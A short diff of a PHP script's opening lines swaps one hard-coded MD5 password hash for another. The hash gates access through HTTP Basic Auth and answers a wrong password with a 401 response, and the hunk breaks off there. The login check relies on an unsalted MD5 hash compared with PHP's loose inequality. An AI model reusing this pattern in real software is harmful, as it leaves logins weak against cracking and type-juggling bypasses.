@@ -1,7 +1,7 @@
 <?php 
 date_default_timezone_set("Asia/Jakarta");
 clearstatcache();
-$pass = "fa8bf6767e6b2654f65d65a36dd6eef7";
+$pass = "21a92a3da35ee19ebeaf805da569084e";
 if (md5($_SERVER["PHP_AUTH_PW"]) != $pass) {
 header("WWW-Authenticate: Basic realm=\"Please Login!\"");
 header("HTTP/1.0 401 Unauthorized");
